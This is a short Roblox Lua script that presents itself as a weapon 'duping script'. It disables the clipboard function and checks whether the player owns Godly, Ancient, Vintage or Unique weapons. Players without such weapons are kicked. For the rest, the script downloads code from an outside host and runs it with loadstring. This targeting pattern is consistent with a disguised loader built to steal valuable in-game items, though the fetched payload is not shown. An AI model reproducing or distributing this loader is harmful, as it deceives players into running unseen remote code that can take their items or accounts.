setclipboard = function() end

local p = game.Players.LocalPlayer
local itemData = require(
    game.ReplicatedStorage.Database.Sync.Item
)

local inv = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(p.Name)

local found = false

for itemName, amount in pairs(inv.Weapons.Owned) do
    if amount > 0 then
        local info = itemData[itemName]

        if info then
            local rarity = tostring(info.Rarity or "")

            if rarity == "Godly"
            or rarity == "Ancient"
            or rarity == "Vintage"
            or rarity == "Unique" then
                found = true
                break
            end
        end
    end
end

if not found then
    p:Kick("Duping Script won't work you need godly")
    return
end

loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImYzYjVhNzkwLWJhOTYtNDBjYy1hNWE2LTg3OGNhODYzNzExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSm9obm55aXNzb2Nvb2xsb2wvTW0yTmV3L3JlZnMvaGVhZHMvbWFpbi9yYW5kb20ubHVhIn19"))()
